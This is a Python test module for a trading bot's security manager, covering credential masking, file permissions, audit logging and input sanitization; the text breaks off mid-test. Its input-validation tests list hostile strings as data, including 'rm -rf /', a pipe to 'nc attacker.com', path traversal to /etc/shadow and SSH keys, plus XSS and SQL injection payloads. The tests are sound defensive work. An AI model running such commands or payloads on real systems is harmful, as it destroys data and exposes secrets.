"""
Comprehensive Security and Credential Management Testing
=======================================================

This module implements comprehensive security testing for the GeneBot trading bot,
covering credential protection, API key handling, input validation, file permissions,
audit logging, and multi-market security isolation.
"""

import os
import stat
import tempfile
import pytest
import json
import hashlib
import secrets
import time
import subprocess
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timezone, timedelta
import yaml
import re

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from genebot.cli.utils.security_manager import SecurityManager, SecurityLevel, CredentialType
from genebot.cli.commands.security import SecurityCommand
from genebot.cli.context import CLIContext
from genebot.cli.result import CommandResult, ResultStatus


class TestCredentialProtection:
    """Test comprehensive credential protection mechanisms"""
    
    @pytest.fixture
    def secure_workspace(self):
        """Create secure workspace for testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            logs_dir = workspace / "logs"
            config_dir.mkdir()
            logs_dir.mkdir()
            
            # Create realistic credential files
            env_file = workspace / ".env"
            env_content = """
# Production API Keys
BINANCE_API_KEY=abcdef1234567890abcdef1234567890abcdef12
BINANCE_SECRET_KEY=supersecretkey1234567890abcdefghijklmnopqrstuvwxyz
OANDA_API_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
MT5_PASSWORD=ComplexP@ssw0rd123!
DATABASE_URL=postgresql://user:dbpass123@localhost:5432/trading
WEBHOOK_SECRET=webhook_secret_key_xyz789
ENCRYPTION_KEY=encryption_key_abcdef123456
WEAK_PASSWORD=123456
EMPTY_VALUE=
"""
            env_file.write_text(env_content)
            env_file.chmod(0o600)
            
            # Create accounts configuration
            accounts_file = config_dir / "accounts.yaml"
            accounts_content = {
                'crypto_exchanges': {
                    'binance': {
                        'api_key_env': 'BINANCE_API_KEY',
                        'secret_key_env': 'BINANCE_SECRET_KEY',
                        'enabled': True,
                        'sandbox': False
                    }
                },
                'forex_brokers': {
                    'oanda': {
                        'api_token_env': 'OANDA_API_TOKEN',
                        'account_id': '001-004-1234567-001',
                        'enabled': True,
                        'environment': 'live'
                    },
                    'mt5': {
                        'server': 'MetaQuotes-Live',
                        'login': '12345678',
                        'password_env': 'MT5_PASSWORD',
                        'enabled': True
                    }
                }
            }
            
            with open(accounts_file, 'w') as f:
                yaml.dump(accounts_content, f)
            accounts_file.chmod(0o644)  # Intentionally insecure for testing
            
            yield workspace
    
    def test_credential_masking_comprehensive(self, secure_workspace):
        """Test comprehensive credential masking across all credential types"""
        security_manager = SecurityManager(workspace_path=secure_workspace)
        
        # Test various credential types
        test_credentials = {
            'api_key': 'abcdef1234567890abcdef1234567890abcdef12',
            'secret_key': 'supersecretkey1234567890abcdefghijklmnopqrstuvwxyz',
            'password': 'ComplexP@ssw0rd123!',
            'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ',
            'database_url': 'postgresql://user:dbpass123@localhost:5432/trading',
            'webhook_secret': 'webhook_secret_key_xyz789'
        }
        
        for cred_name, cred_value in test_credentials.items():
            # Detect credential type
            cred_type = security_manager._detect_credential_type(cred_name.upper(), cred_value)
            if cred_type:
                masked = security_manager._mask_credential(cred_value, cred_type)
                
                # Verify masking
                assert masked != cred_value, f"Credential {cred_name} should be masked"
                assert len(masked) < len(cred_value), f"Masked {cred_name} should be shorter"
                assert '***' in masked or '...' in masked, f"Masked {cred_name} should contain masking characters"
                
                # Verify original value is not exposed
                assert cred_value not in masked, f"Original {cred_name} should not appear in masked version"
    
    def test_credential_strength_analysis(self, secure_workspace):
        """Test comprehensive credential strength analysis"""
        security_manager = SecurityManager(workspace_path=secure_workspace)
        
        # Test various credential strengths
        strength_tests = [
            # (credential, expected_min_strength, expected_max_strength)
            ('123456', 0, 30),  # Very weak
            ('password', 10, 40),  # Weak
            ('Password123', 40, 70),  # Medium
            ('ComplexP@ssw0rd123!', 70, 100),  # Strong
            ('abcdef1234567890abcdef1234567890abcdef12', 60, 100),  # Long API key
            ('', 0, 0),  # Empty
        ]
        
        for credential, min_strength, max_strength in strength_tests:
            strength = security_manager._calculate_credential_strength(
                credential, CredentialType.PASSWORD
            )
            
            assert min_strength <= strength <= max_strength, \
                f"Credential '{credential}' strength {strength} not in range [{min_strength}, {max_strength}]"
    
    def test_credential_validation_without_exposure(self, secure_workspace):
        """Test that credential validation never exposes actual values"""
        security_manager = SecurityManager(workspace_path=secure_workspace)
        
        result = security_manager.validate_credentials_secure()
        
        # Should succeed or warn, but not error
        assert result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING]
        
        # Check that no actual credential values are in the result
        result_str = str(result.data) + str(result.message) + str(result.suggestions)
        
        sensitive_values = [
            'abcdef1234567890abcdef1234567890abcdef12',
            'supersecretkey1234567890abcdefghijklmnopqrstuvwxyz',
            'ComplexP@ssw0rd123!',
            'dbpass123',
            'webhook_secret_key_xyz789'
        ]
        
        for sensitive_value in sensitive_values:
            assert sensitive_value not in result_str, \
                f"Sensitive value '{sensitive_value}' found in validation result"
        
        # Verify credentials were found and analyzed
        if result.data and 'credentials' in result.data:
            credentials = result.data['credentials']
            assert len(credentials) > 0, "Should find credentials in .env file"
            
            for cred in credentials:
                assert 'masked_value' in cred, "Each credential should have masked value"
                assert 'strength_score' in cred, "Each credential should have strength score"
                assert cred['masked_value'] != "", "Masked value should not be empty"
    
    def test_no_credentials_in_logs(self, secure_workspace):
        """Test that credentials never appear in log files"""
        security_manager = SecurityManager(workspace_path=secure_workspace)
        
        # Perform operations that might log credentials
        security_manager.validate_credentials_secure()
        security_manager.audit_workspace_security()
        
        # Check all log files
        logs_dir = secure_workspace / "logs"
        for log_file in logs_dir.glob("*.log"):
            if log_file.exists() and log_file.stat().st_size > 0:
                log_content = log_file.read_text()
                
                # Check for credential exposure
                sensitive_patterns = [
                    'abcdef1234567890abcdef1234567890abcdef12',
                    'supersecretkey1234567890abcdefghijklmnopqrstuvwxyz',
                    'ComplexP@ssw0rd123!',
                    'dbpass123',
                    'webhook_secret_key_xyz789'
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in log_content, \
                        f"Sensitive pattern '{pattern}' found in log file {log_file}"
    
    def test_credential_rotation_recommendations(self, secure_workspace):
        """Test credential rotation recommendations"""
        security_manager = SecurityManager(workspace_path=secure_workspace)
        
        result = security_manager.generate_credential_rotation_guide()
        
        assert result.status == ResultStatus.SUCCESS
        assert result.data is not None
        
        guide = result.data
        assert 'overview' in guide
        assert 'procedures' in guide
        assert 'current_status' in guide
        assert 'next_actions' in guide
        
        # Verify rotation recommendations are provided
        if guide['current_status']:
            for cred_name, status in guide['current_status'].items():
                assert 'rotation_due' in status
                assert 'strength' in status
                assert 'type' in status
                assert 'masked_value' in status
                
                # Verify no actual credentials in status
                assert status['masked_value'] != status.get('actual_value', 'N/A')


class TestFilePermissionSecurity:
    """Test comprehensive file permission security"""
    
    @pytest.fixture
    def permission_test_workspace(self):
        """Create workspace with various file permission scenarios"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            logs_dir = workspace / "logs"
            backups_dir = workspace / "backups"
            
            config_dir.mkdir()
            logs_dir.mkdir()
            backups_dir.mkdir()
            
            # Create files with various permission levels
            files_to_create = [
                (workspace / ".env", 0o644, "API_KEY=test123"),  # Insecure
                (workspace / ".env.example", 0o644, "API_KEY=your_key_here"),  # OK for example
                (config_dir / "accounts.yaml", 0o644, "accounts: {}"),  # Insecure
                (config_dir / "trading_bot_config.yaml", 0o644, "config: {}"),  # Insecure
                (workspace / "private.key", 0o644, "-----BEGIN PRIVATE KEY-----"),  # Very insecure
                (workspace / "certificate.pem", 0o644, "-----BEGIN CERTIFICATE-----"),  # Insecure
                (logs_dir / "trading.log", 0o644, "log data"),  # OK for logs
                (backups_dir / "backup.tar.gz", 0o644, "backup data"),  # Should be secure
            ]
            
            for file_path, permissions, content in files_to_create:
                file_path.write_text(content)
                file_path.chmod(permissions)
            
            yield workspace
    
    def test_file_permission_detection(self, permission_test_workspace):
        """Test detection of insecure file permissions"""
        security_manager = SecurityManager(workspace_path=permission_test_workspace)
        
        result = security_manager.audit_workspace_security()
        
        assert result.status in [ResultStatus.WARNING, ResultStatus.ERROR]
        assert result.data is not None
        
        audit_data = result.data
        
        # Should find multiple insecure files
        total_issues = (
            len(audit_data['critical_issues']) +
            len(audit_data['high_issues']) +
            len(audit_data['medium_issues'])
        )
        
        assert total_issues > 0, "Should detect insecure file permissions"
        
        # Check for specific critical issues
        critical_files = [issue.get('file', '') for issue in audit_data['critical_issues']]
        
        # .env and private keys should be critical
        assert any('.env' in f for f in critical_files), "Should detect insecure .env file"
        assert any('private.key' in f for f in critical_files), "Should detect insecure private key"
    
    def test_permission_fixing(self, permission_test_workspace):
        """Test automatic permission fixing"""
        security_manager = SecurityManager(workspace_path=permission_test_workspace)
        
        # Get initial state
        initial_audit = security_manager.audit_workspace_security()
        initial_issues = (
            len(initial_audit.data['critical_issues']) +
            len(initial_audit.data['high_issues']) +
            len(initial_audit.data['medium_issues'])
        )
        
        # Fix permissions
        fix_result = security_manager.fix_file_permissions(dry_run=False)
        
        # Should succeed or warn
        assert fix_result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING]
        
        # Check that some fixes were applied
        if fix_result.data and 'fixes_applied' in fix_result.data:
            fixes = fix_result.data['fixes_applied']
            if fixes:
                # Verify actual permission changes
                for fix in fixes:
                    file_path = Path(fix['file'])
                    if file_path.exists():
                        current_permissions = file_path.stat().st_mode & 0o777
                        expected_permissions = int(fix['new_permissions'], 8)
                        assert current_permissions == expected_permissions, \
                            f"File {file_path} permissions not fixed correctly"
        
        # Audit again to verify improvements
        final_audit = security_manager.audit_workspace_security()
        final_issues = (
            len(final_audit.data['critical_issues']) +
            len(final_audit.data['high_issues']) +
            len(final_audit.data['medium_issues'])
        )
        
        # Should have fewer or equal issues
        assert final_issues <= initial_issues, "Permission fixing should reduce issues"
    
    def test_permission_recommendations(self, permission_test_workspace):
        """Test permission fix recommendations"""
        security_manager = SecurityManager(workspace_path=permission_test_workspace)
        
        # Check specific files
        test_files = [
            permission_test_workspace / ".env",
            permission_test_workspace / "private.key",
            permission_test_workspace / "config" / "accounts.yaml"
        ]
        
        for test_file in test_files:
            if test_file.exists():
                file_security = security_manager.check_file_permissions(test_file)
                
                if not file_security.is_secure:
                    assert len(file_security.recommendations) > 0, \
                        f"Should provide recommendations for insecure file {test_file}"
                    
                    # Recommendations should include chmod commands
                    recommendations_str = ' '.join(file_security.recommendations)
                    assert 'chmod' in recommendations_str, \
                        f"Recommendations should include chmod command for {test_file}"


class TestInputValidationSecurity:
    """Test comprehensive input validation and sanitization"""
    
    @pytest.fixture
    def validation_workspace(self):
        """Create workspace for input validation testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create basic configuration
            accounts_file = config_dir / "accounts.yaml"
            accounts_file.write_text("crypto_exchanges: {}\nforex_brokers: {}")
            accounts_file.chmod(0o600)
            
            yield workspace
    
    def test_path_traversal_prevention(self, validation_workspace):
        """Test prevention of path traversal attacks"""
        security_manager = SecurityManager(workspace_path=validation_workspace)
        
        # Test malicious path inputs
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            '../../../../root/.ssh/id_rsa',
            '..\\..\\..\\..\\Users\\Administrator\\Desktop\\sensitive.txt'
        ]
        
        for malicious_path in malicious_paths:
            # Test path sanitization
            sanitized = security_manager.sanitize_file_path(malicious_path)
            
            # Should not contain path traversal sequences
            assert '..' not in sanitized, f"Path traversal not prevented: {malicious_path}"
            assert not Path(sanitized).is_absolute() or sanitized.startswith(str(validation_workspace)), \
                f"Absolute path not contained to workspace: {malicious_path}"
    
    def test_command_injection_prevention(self, validation_workspace):
        """Test prevention of command injection attacks"""
        security_manager = SecurityManager(workspace_path=validation_workspace)
        
        # Test command injection attempts
        injection_attempts = [
            'test; rm -rf /',
            'test && cat /etc/passwd',
            'test | nc attacker.com 1234',
            'test`whoami`',
            'test$(id)',
            'test; shutdown -h now',
            'test & del /f /q C:\\*.*',
            'test || format C:',
        ]
        
        for injection in injection_attempts:
            # Test input sanitization
            sanitized = security_manager.sanitize_input(injection)
            
            # Should remove or escape dangerous characters
            dangerous_chars = [';', '&&', '||', '`', '$', '|', '&']
            for char in dangerous_chars:
                if char in injection:
                    assert char not in sanitized or sanitized != injection, \
                        f"Command injection not prevented: {injection}"
    
    def test_xss_prevention(self, validation_workspace):
        """Test prevention of XSS in output"""
        security_manager = SecurityManager(workspace_path=validation_workspace)
        
        # Test XSS attempts
        xss_attempts = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            'javascript:alert("xss")',
            '<svg onload=alert("xss")>',
            '<iframe src="javascript:alert(\'xss\')"></iframe>',
            '<body onload=alert("xss")>',
        ]
        
        for xss in xss_attempts:
            # Test output sanitization
            sanitized = security_manager.sanitize_output(xss)
            
            # Should remove or escape dangerous HTML/JS
            dangerous_patterns = ['<script>', 'javascript:', 'onerror=', 'onload=', '<iframe']
            for pattern in dangerous_patterns:
                if pattern in xss.lower():
                    assert pattern not in sanitized.lower(), \
                        f"XSS not prevented: {xss}"
    
    def test_sql_injection_prevention(self, validation_workspace):
        """Test prevention of SQL injection"""
        security_manager = SecurityManager(workspace_path=validation_workspace)
        
        # Test SQL injection attempts
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO accounts VALUES ('hacker'); --",
            "' UNION SELECT * FROM sensitive_data --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
        ]
        
        for injection in sql_injections:
            # Test SQL input sanitization
            sanitized = security_manager.sanitize_sql_input(injection)
            
            # Should escape or remove dangerous SQL patterns
            dangerous_sql = ["';", "DROP", "INSERT", "UNION", "--", "/*", "#"]
            for pattern in dangerous_sql:
                if pattern in injection:
                    assert pattern not in sanitized or sanitized != injection, \
                        f"SQL injection not prevented: {injection}"


class TestAuditLoggingSecurity:
    """Test comprehensive audit logging security"""
    
    @pytest.fixture
    def audit_workspace(self):
        """Create workspace for audit logging tests"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            logs_dir = workspace / "logs"
            config_dir.mkdir()
            logs_dir.mkdir()
            
            # Create configuration
            env_file = workspace / ".env"
            env_file.write_text("API_KEY=test_key_123\nSECRET=test_secret_456")
            env_file.chmod(0o600)
            
            yield workspace
    
    def test_comprehensive_audit_logging(self, audit_workspace):
        """Test that all sensitive operations are logged"""
        security_manager = SecurityManager(workspace_path=audit_workspace)
        
        # Perform various sensitive operations
        operations = [
            ('credential_validation', lambda: security_manager.validate_credentials_secure()),
            ('security_audit', lambda: security_manager.audit_workspace_security()),
            ('permission_check', lambda: security_manager.check_file_permissions(audit_workspace / ".env")),
            ('rotation_guide', lambda: security_manager.generate_credential_rotation_guide()),
        ]
        
        for operation_name, operation_func in operations:
            result = operation_func()
            # Operations should succeed or warn
            assert result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING, ResultStatus.ERROR]
        
        # Check audit log
        audit_log_result = security_manager.get_audit_log(limit=20)
        assert audit_log_result.status == ResultStatus.SUCCESS
        
        entries = audit_log_result.data['entries']
        assert len(entries) >= len(operations), "All operations should be logged"
        
        # Verify audit entry structure
        for entry in entries:
            assert 'timestamp' in entry
            assert 'operation' in entry
            assert 'resource' in entry
            assert 'security_level' in entry
            assert 'success' in entry
            assert 'user' in entry
            
            # Verify no sensitive data in audit logs
            entry_str = str(entry)
            assert 'test_key_123' not in entry_str, "API key should not be in audit log"
            assert 'test_secret_456' not in entry_str, "Secret should not be in audit log"
    
    def test_audit_log_integrity(self, audit_workspace):
        """Test audit log integrity and tamper detection"""
        security_manager = SecurityManager(workspace_path=audit_workspace)
        
        # Create audit entries
        test_entries = [
            ('test_operation_1', 'test_resource_1', SecurityLevel.HIGH, True),
            ('test_operation_2', 'test_resource_2', SecurityLevel.MEDIUM, False),
            ('test_operation_3', 'test_resource_3', SecurityLevel.CRITICAL, True),
        ]
        
        for operation, resource, level, success in test_entries:
            security_manager._log_audit_entry(
                operation=operation,
                resource=resource,
                security_level=level,
                success=success,
                details={'test': 'data'}
            )
        
        # Verify audit log file exists and has content
        audit_log_file = security_manager.audit_log_file
        assert audit_log_file.exists(), "Audit log file should exist"
        
        log_content = audit_log_file.read_text()
        assert len(log_content.strip()) > 0, "Audit log should have content"
        
        # Verify all operations are logged
        for operation, _, _, _ in test_entries:
            assert operation in log_content, f"Operation {operation} should be in audit log"
        
        # Test log retrieval
        log_result = security_manager.get_audit_log(limit=10)
        assert log_result.status == ResultStatus.SUCCESS
        
        retrieved_entries = log_result.data['entries']
        assert len(retrieved_entries) >= len(test_entries), "Should retrieve all logged entries"
    
    def test_audit_log_permissions(self, audit_workspace):
        """Test that audit logs have secure permissions"""
        security_manager = SecurityManager(workspace_path=audit_workspace)
        
        # Create audit log entry
        security_manager._log_audit_entry(
            operation="test_operation",
            resource="test_resource",
            security_level=SecurityLevel.HIGH,
            success=True,
            details={}
        )
        
        # Check audit log file permissions
        audit_log_file = security_manager.audit_log_file
        if audit_log_file.exists():
            file_stat = audit_log_file.stat()
            permissions = file_stat.st_mode & 0o777
            
            # Audit log should not be world-readable or world-writable
            assert not (permissions & stat.S_IROTH), "Audit log should not be world-readable"
            assert not (permissions & stat.S_IWOTH), "Audit log should not be world-writable"
            
            # Should be readable by owner
            assert permissions & stat.S_IRUSR, "Audit log should be readable by owner"


class TestMultiMarketSecurityIsolation:
    """Test security isolation between different markets"""
    
    @pytest.fixture
    def multi_market_workspace(self):
        """Create workspace with multi-market configuration"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create multi-market environment file
            env_file = workspace / ".env"
            env_content = """
# Crypto Exchange Credentials
BINANCE_API_KEY=crypto_binance_key_12345678901234567890
BINANCE_SECRET_KEY=crypto_binance_secret_abcdefghijklmnopqrstuvwxyz
COINBASE_API_KEY=crypto_coinbase_key_98765432109876543210
COINBASE_SECRET_KEY=crypto_coinbase_secret_zyxwvutsrqponmlkjihgfedcba
COINBASE_PASSPHRASE=crypto_coinbase_passphrase_123

# Forex Broker Credentials
OANDA_API_TOKEN=forex_oanda_token_abcdef123456789012345678
OANDA_ACCOUNT_ID=forex_oanda_account_001-004-1234567-001
MT5_SERVER=MetaQuotes-Live
MT5_LOGIN=forex_mt5_login_12345678
MT5_PASSWORD=forex_mt5_password_ComplexP@ss123

# Database and Infrastructure
DATABASE_URL=postgresql://user:dbpass@localhost:5432/trading
REDIS_URL=redis://localhost:6379/0
WEBHOOK_SECRET=webhook_secret_xyz789
"""
            env_file.write_text(env_content)
            env_file.chmod(0o600)
            
            # Create multi-market accounts configuration
            accounts_file = config_dir / "accounts.yaml"
            accounts_content = {
                'crypto_exchanges': {
                    'binance': {
                        'api_key_env': 'BINANCE_API_KEY',
                        'secret_key_env': 'BINANCE_SECRET_KEY',
                        'enabled': True,
                        'market_type': 'crypto'
                    },
                    'coinbase': {
                        'api_key_env': 'COINBASE_API_KEY',
                        'secret_key_env': 'COINBASE_SECRET_KEY',
                        'passphrase_env': 'COINBASE_PASSPHRASE',
                        'enabled': True,
                        'market_type': 'crypto'
                    }
                },
                'forex_brokers': {
                    'oanda': {
                        'api_token_env': 'OANDA_API_TOKEN',
                        'account_id_env': 'OANDA_ACCOUNT_ID',
                        'enabled': True,
                        'market_type': 'forex'
                    },
                    'mt5': {
                        'server_env': 'MT5_SERVER',
                        'login_env': 'MT5_LOGIN',
                        'password_env': 'MT5_PASSWORD',
                        'enabled': True,
                        'market_type': 'forex'
                    }
                }
            }
            
            with open(accounts_file, 'w') as f:
                yaml.dump(accounts_content, f)
            accounts_file.chmod(0o600)
            
            yield workspace
    
    def test_credential_isolation_by_market_type(self, multi_market_workspace):
        """Test that credentials are properly isolated by market type"""
        security_manager = SecurityManager(workspace_path=multi_market_workspace)
        
        result = security_manager.validate_credentials_secure()
        
        assert result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING]
        assert 'credentials' in result.data
        
        credentials = result.data['credentials']
        
        # Categorize credentials by market type
        crypto_credentials = []
        forex_credentials = []
        infrastructure_credentials = []
        
        for cred in credentials:
            cred_name = cred['name'].upper()
            if 'BINANCE' in cred_name or 'COINBASE' in cred_name:
                crypto_credentials.append(cred)
            elif 'OANDA' in cred_name or 'MT5' in cred_name:
                forex_credentials.append(cred)
            else:
                infrastructure_credentials.append(cred)
        
        # Verify isolation - crypto credentials should not contain forex data
        for crypto_cred in crypto_credentials:
            cred_str = str(crypto_cred)
            assert 'oanda' not in cred_str.lower(), "Crypto credentials should not contain OANDA data"
            assert 'mt5' not in cred_str.lower(), "Crypto credentials should not contain MT5 data"
            assert 'forex' not in cred_str.lower(), "Crypto credentials should not contain forex references"
        
        # Verify isolation - forex credentials should not contain crypto data
        for forex_cred in forex_credentials:
            cred_str = str(forex_cred)
            assert 'binance' not in cred_str.lower(), "Forex credentials should not contain Binance data"
            assert 'coinbase' not in cred_str.lower(), "Forex credentials should not contain Coinbase data"
            assert 'crypto' not in cred_str.lower(), "Forex credentials should not contain crypto references"
    
    def test_no_cross_market_credential_exposure(self, multi_market_workspace):
        """Test that credentials from one market are never exposed in another market's context"""
        security_manager = SecurityManager(workspace_path=multi_market_workspace)
        
        # Perform comprehensive security audit
        audit_result = security_manager.audit_workspace_security()
        
        # Get credential validation results
        cred_result = security_manager.validate_credentials_secure()
        
        # Combine all result data
        all_result_data = str(audit_result.data) + str(cred_result.data) + \
                         str(audit_result.message) + str(cred_result.message)
        
        # Define market-specific sensitive values
        crypto_sensitive = [
            'crypto_binance_key_12345678901234567890',
            'crypto_binance_secret_abcdefghijklmnopqrstuvwxyz',
            'crypto_coinbase_key_98765432109876543210',
            'crypto_coinbase_secret_zyxwvutsrqponmlkjihgfedcba',
            'crypto_coinbase_passphrase_123'
        ]
        
        forex_sensitive = [
            'forex_oanda_token_abcdef123456789012345678',
            'forex_oanda_account_001-004-1234567-001',
            'forex_mt5_login_12345678',
            'forex_mt5_password_ComplexP@ss123'
        ]
        
        # Verify no actual credential values are exposed anywhere
        for sensitive_value in crypto_sensitive + forex_sensitive:
            assert sensitive_value not in all_result_data, \
                f"Sensitive value '{sensitive_value}' found in security results"
    
    def test_market_specific_security_levels(self, multi_market_workspace):
        """Test that different markets can have different security requirements"""
        security_manager = SecurityManager(workspace_path=multi_market_workspace)
        
        # Test file security levels for different market contexts
        env_file = multi_market_workspace / ".env"
        accounts_file = multi_market_workspace / "config" / "accounts.yaml"
        
        env_security = security_manager.check_file_permissions(env_file)
        accounts_security = security_manager.check_file_permissions(accounts_file)
        
        # Both should be secure (600 permissions)
        assert env_security.is_secure, ".env file should be secure"
        assert accounts_security.is_secure, "accounts.yaml file should be secure"
        
        # Test security level detection
        env_level = security_manager._get_file_security_level(env_file)
        accounts_level = security_manager._get_file_security_level(accounts_file)
        
        # .env should be critical, accounts.yaml should be high
        assert env_level == SecurityLevel.CRITICAL, ".env should be critical security level"
        assert accounts_level == SecurityLevel.HIGH, "accounts.yaml should be high security level"


class TestSecurityIntegrationWorkflow:
    """Test complete security workflow integration"""
    
    @pytest.fixture
    def integration_workspace(self):
        """Create comprehensive workspace for integration testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            
            # Create full directory structure
            directories = [
                "config", "logs", "backups", "reports", "scripts"
            ]
            
            for directory in directories:
                (workspace / directory).mkdir()
            
            # Create comprehensive configuration
            env_file = workspace / ".env"
            env_content = """
# Production Trading Bot Configuration
BINANCE_API_KEY=prod_binance_api_key_1234567890abcdef1234567890abcdef
BINANCE_SECRET_KEY=prod_binance_secret_abcdefghijklmnopqrstuvwxyz1234567890
OANDA_API_TOKEN=prod_oanda_token_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0
DATABASE_PASSWORD=prod_database_password_ComplexP@ssw0rd123!
REDIS_PASSWORD=prod_redis_password_AnotherC0mplexP@ss
WEBHOOK_SECRET=prod_webhook_secret_xyz789abc123def456
ENCRYPTION_KEY=prod_encryption_key_32_byte_key_here
JWT_SECRET=prod_jwt_secret_for_authentication_xyz
API_RATE_LIMIT_KEY=prod_rate_limit_key_abcdef123456
MONITORING_API_KEY=prod_monitoring_api_key_987654321
"""
            env_file.write_text(env_content)
            env_file.chmod(0o600)
            
            # Create accounts configuration with mixed security
            accounts_file = workspace / "config" / "accounts.yaml"
            accounts_content = {
                'crypto_exchanges': {
                    'binance': {
                        'api_key_env': 'BINANCE_API_KEY',
                        'secret_key_env': 'BINANCE_SECRET_KEY',
                        'enabled': True,
                        'sandbox': False
                    }
                },
                'forex_brokers': {
                    'oanda': {
                        'api_token_env': 'OANDA_API_TOKEN',
                        'account_id': '001-004-1234567-001',
                        'enabled': True,
                        'environment': 'live'
                    }
                }
            }
            
            with open(accounts_file, 'w') as f:
                yaml.dump(accounts_content, f)
            accounts_file.chmod(0o644)  # Intentionally insecure
            
            # Create other configuration files
            config_files = [
                ("config/trading_bot_config.yaml", 0o644, "bot_config: {}"),
                ("config/strategies.yaml", 0o644, "strategies: {}"),
                ("private.key", 0o644, "-----BEGIN PRIVATE KEY-----\ntest\n-----END PRIVATE KEY-----"),
                ("certificate.pem", 0o644, "-----BEGIN CERTIFICATE-----\ntest\n-----END CERTIFICATE-----"),
            ]
            
            for file_path, permissions, content in config_files:
                full_path = workspace / file_path
                full_path.write_text(content)
                full_path.chmod(permissions)
            
            yield workspace
    
    def test_complete_security_workflow(self, integration_workspace):
        """Test complete security workflow from audit to remediation"""
        context = CLIContext(
            config_path=integration_workspace / "config",
            workspace_path=integration_workspace,
            verbose=True,
            dry_run=False
        )
        
        security_command = SecurityCommand(context=context)
        
        # Step 1: Initial comprehensive security audit
        audit_result = security_command.execute(
            type('Args', (), {'security_action': 'audit'})()
        )
        
        assert audit_result.status in [ResultStatus.WARNING, ResultStatus.ERROR]
        
        initial_critical = len(audit_result.data['critical_issues'])
        initial_high = len(audit_result.data['high_issues'])
        initial_medium = len(audit_result.data['medium_issues'])
        initial_total = initial_critical + initial_high + initial_medium
        
        assert initial_total > 0, "Should find security issues in initial audit"
        
        # Step 2: Validate credentials without exposure
        cred_result = security_command.execute(
            type('Args', (), {'security_action': 'validate-credentials', 'env_file': None})()
        )
        
        assert cred_result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING]
        
        # Verify no credential exposure
        result_str = str(cred_result.data) + str(cred_result.message)
        sensitive_patterns = [
            'prod_binance_api_key_1234567890abcdef1234567890abcdef',
            'prod_binance_secret_abcdefghijklmnopqrstuvwxyz1234567890',
            'prod_database_password_ComplexP@ssw0rd123!',
            'prod_webhook_secret_xyz789abc123def456'
        ]
        
        for pattern in sensitive_patterns:
            assert pattern not in result_str, f"Credential '{pattern}' exposed in validation result"
        
        # Step 3: Generate rotation guide
        rotation_result = security_command.execute(
            type('Args', (), {'security_action': 'rotation-guide'})()
        )
        
        assert rotation_result.status == ResultStatus.SUCCESS
        assert 'procedures' in rotation_result.data
        assert 'current_status' in rotation_result.data
        
        # Step 4: Fix permissions (dry run first)
        dry_fix_result = security_command.execute(
            type('Args', (), {'security_action': 'fix-permissions', 'dry_run': True})()
        )
        
        assert dry_fix_result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING]
        
        # Step 5: Fix permissions (actual)
        fix_result = security_command.execute(
            type('Args', (), {'security_action': 'fix-permissions', 'dry_run': False})()
        )
        
        assert fix_result.status in [ResultStatus.SUCCESS, ResultStatus.WARNING]
        
        # Step 6: Final security audit to verify improvements
        final_audit_result = security_command.execute(
            type('Args', (), {'security_action': 'audit'})()
        )
        
        final_critical = len(final_audit_result.data['critical_issues'])
        final_high = len(final_audit_result.data['high_issues'])
        final_medium = len(final_audit_result.data['medium_issues'])
        final_total = final_critical + final_high + final_medium
        
        # Should have fewer or equal issues after remediation
        assert final_total <= initial_total, "Security remediation should reduce issues"
        
        # Step 7: Verify audit logging
        log_result = security_command.execute(
            type('Args', (), {
                'security_action': 'audit-log',
                'limit': 20,
                'operation': None,
                'user': None,
                'days': 1
            })()
        )
        
        assert log_result.status == ResultStatus.SUCCESS
        assert len(log_result.data['entries']) >= 6, "Should have logged all security operations"
        
        # Verify no sensitive data in audit logs
        log_entries_str = str(log_result.data['entries'])
        for pattern in sensitive_patterns:
            assert pattern not in log_entries_str, f"Credential '{pattern}' found in audit logs"
    
    def test_security_monitoring_and_alerting(self, integration_workspace):
        """Test security monitoring and alerting capabilities"""
        security_manager = SecurityManager(workspace_path=integration_workspace)
        
        # Simulate security events
        security_events = [
            ('failed_authentication', SecurityLevel.HIGH, False),
            ('credential_validation', SecurityLevel.MEDIUM, True),
            ('permission_change', SecurityLevel.HIGH, True),
            ('suspicious_access', SecurityLevel.CRITICAL, False),
            ('audit_log_access', SecurityLevel.MEDIUM, True),
        ]
        
        for event, level, success in security_events:
            security_manager._log_audit_entry(
                operation=event,
                resource='test_resource',
                security_level=level,
                success=success,
                details={'monitoring_test': True}
            )
        
        # Retrieve and analyze security events
        log_result = security_manager.get_audit_log(limit=10)
